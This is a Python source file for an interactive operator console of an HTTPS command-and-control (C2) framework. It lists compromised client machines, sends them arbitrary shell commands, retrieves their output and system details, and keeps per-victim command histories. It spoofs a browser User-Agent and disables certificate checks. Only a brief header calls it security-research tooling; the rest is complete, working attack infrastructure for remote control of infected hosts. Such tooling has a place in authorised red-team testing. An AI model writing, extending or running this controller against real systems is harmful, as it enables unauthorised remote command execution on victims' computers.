# Internet-ready HTTPS C2 Controller
# For legitimate security research and testing purposes
# run this code by python .\Command.py --server https://192.168.1.7:8443 --no-verify
#https://192.168.1.7:8443 should be you server IP


import requests
import json
import time
import sys
import argparse
import urllib3
from tabulate import tabulate
from datetime import datetime
import os
import cmd

# Suppress SSL warnings for development
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CommandCenter(cmd.Cmd):
    """Interactive command shell for the C2 server"""
    prompt = 'C2> '
    intro = 'HTTPS C2 Command Center. Type help or ? to list commands.'
    
    def __init__(self, server_url, verify_ssl=False):
        super().__init__()
        self.server_url = server_url
        self.verify_ssl = verify_ssl
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.active_client = None
        # Create a directory to store command history
        self.history_dir = "command_history"
        os.makedirs(self.history_dir, exist_ok=True)
    
    def update_prompt(self):
        """Update the command prompt to show active client"""
        if self.active_client:
            self.prompt = f"C2 [{self.active_client[:8]}...] > "
        else:
            self.prompt = "C2> "
    
    def do_connect(self, arg):
        """Connect to a specific client: connect <client_id>"""
        if not arg:
            print("Error: Client ID required")
            print("Usage: connect <client_id>")
            return
        
        self.active_client = arg.strip()
        print(f"Active client set to: {self.active_client}")
        self.update_prompt()
        
        # Try to load command history
        try:
            history_file = os.path.join(self.history_dir, f"{self.active_client}.txt")
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    for line in f.readlines():
                        print(f"Previous command: {line.strip()}")
        except Exception as e:
            print(f"Error loading command history: {e}")
    
    def do_list(self, arg):
        """List all registered clients"""
        try:
            response = requests.get(
                f"{self.server_url}/list_clients",
                headers=self.headers,
                verify=self.verify_ssl
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    clients = result.get('clients', [])
                    if not clients:
                        print("No clients registered")
                        return
                    
                    table_data = []
                    for client in clients:
                        table_data.append([
                            client.get('client_id'),
                            client.get('last_ip', 'Unknown'),
                            client.get('response_count', 0)
                        ])
                    
                    print(tabulate(table_data, headers=["Client ID", "Last IP", "Response Count"]))
                else:
                    print(f"Error: {result.get('message')}")
            else:
                print(f"Error: HTTP status code {response.status_code}")
        except Exception as e:
            print(f"Error listing clients: {e}")
    
    def do_send(self, arg):
        """Send a command to the active client: send <command>"""
        if not self.active_client:
            print("No active client. Use 'connect <client_id>' first.")
            return
        
        if not arg:
            print("Error: Command required")
            print("Usage: send <command>")
            return
        
        command = arg.strip()
        self.send_command(self.active_client, command)
        
        # Save command to history
        try:
            history_file = os.path.join(self.history_dir, f"{self.active_client}.txt")
            with open(history_file, 'a') as f:
                f.write(f"{command}\n")
        except Exception as e:
            print(f"Error saving command history: {e}")
    
    def default(self, line):
        """Handle unknown commands as commands to send to the client"""
        if self.active_client:
            self.do_send(line)
        else:
            print(f"Unknown command: {line}")
            print("No active client. Use 'connect <client_id>' first.")
    
    def do_responses(self, arg):
        """Get responses from the active client"""
        if not self.active_client:
            print("No active client. Use 'connect <client_id>' first.")
            return
        
        responses = self.get_responses(self.active_client)
        self.print_responses(responses)
    
    def do_info(self, arg):
        """Display information about the active client"""
        if not self.active_client:
            print("No active client. Use 'connect <client_id>' first.")
            return
        
        responses = self.get_responses(self.active_client)
        for resp in responses:
            if resp.get('cmd_id') == 'system_info':
                print("\n=== Client System Information ===")
                result = resp.get('result', {})
                for key, value in result.items():
                    if key == 'network_interfaces':
                        print("\nNetwork Interfaces:")
                        for iface in value:
                            print(iface)
                    else:
                        print(f"{key}: {value}")
                return
        
        print("System information not available for this client.")
        print("Try sending this command: systeminfo || uname -a")
    
    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_server(self, arg):
        """Display server information"""
        print(f"Server URL: {self.server_url}")
        print(f"SSL Verification: {self.verify_ssl}")
    
    def do_exit(self, arg):
        """Exit the command center"""
        print("Exiting command center")
        return True
    
    def do_quit(self, arg):
        """Exit the command center"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Exit on Ctrl-D"""
        print()  # Add a newline
        return self.do_exit(arg)
    
    def send_command(self, client_id, command):
        """Send a command to a specific client"""
        data = {
            'client_id': client_id,
            'command': command
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/issue_command",
                headers=self.headers,
                json=data,
                verify=self.verify_ssl
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    cmd_id = result.get('cmd_id')
                    print(f"Command sent successfully. Command ID: {cmd_id}")
                    return True
                else:
                    print(f"Error: {result.get('message')}")
            else:
                print(f"Error: HTTP status code {response.status_code}")
        except Exception as e:
            print(f"Error sending command: {e}")
        
        return False
    
    def get_responses(self, client_id):
        """Get responses from a specific client"""
        data = {'client_id': client_id}
        
        try:
            response = requests.post(
                f"{self.server_url}/get_responses",
                headers=self.headers,
                json=data,
                verify=self.verify_ssl
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    return result.get('responses', [])
                else:
                    print(f"Error: {result.get('message')}")
            else:
                print(f"Error: HTTP status code {response.status_code}")
        except Exception as e:
            print(f"Error getting responses: {e}")
        
        return []
    
    def print_responses(self, responses):
        """Print responses in a readable format"""
        if not responses:
            print("No responses available.")
            return
        
        table_data = []
        for resp in responses:
            cmd_id = resp.get('cmd_id', 'N/A')
            timestamp = resp.get('timestamp', 0)
            dt = datetime.fromtimestamp(timestamp)
            result = resp.get('result', {})
            
            # Skip system info responses as they're handled separately
            if cmd_id == 'system_info':
                continue
                
            stdout = result.get('stdout', '')
            stderr = result.get('stderr', '')
            error = result.get('error', '')
            
            output = stdout
            if stderr:
                output += f"\n[STDERR]: {stderr}"
            if error:
                output += f"\n[ERROR]: {error}"
            
            table_data.append([cmd_id[:8], dt.strftime('%Y-%m-%d %H:%M:%S'), output])
        
        if not table_data:
            print("No command responses available.")
            return
            
        print(tabulate(table_data, headers=["Command", "Timestamp", "Output"]))

def check_server_connection(url, verify_ssl):
    """Check if the server is reachable"""
    try:
        response = requests.get(
            f"{url}/list_clients",
            verify=verify_ssl,
            timeout=5
        )
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f"Error connecting to server: {e}")
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTPS C2 Command Center')
    parser.add_argument('--server', default='https://localhost:8443', help='C2 server URL')
    parser.add_argument('--no-verify', action='store_true', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    print(f"\nConnecting to C2 server at {args.server}...")
    if not check_server_connection(args.server, not args.no_verify):
        print("Unable to connect to server. Please check the server URL and ensure the server is running.")
        print("You can continue anyway, but commands will fail until the server is available.")
        print("Usage: python command_center.py --server https://your-server-ip:8443 --no-verify\n")
    
    center = CommandCenter(
        server_url=args.server,
        verify_ssl=not args.no_verify
    )
    
    try:
        center.cmdloop()
    except KeyboardInterrupt:
        print("\nExiting command center")
    except Exception as e:
        print(f"Error: {e}")
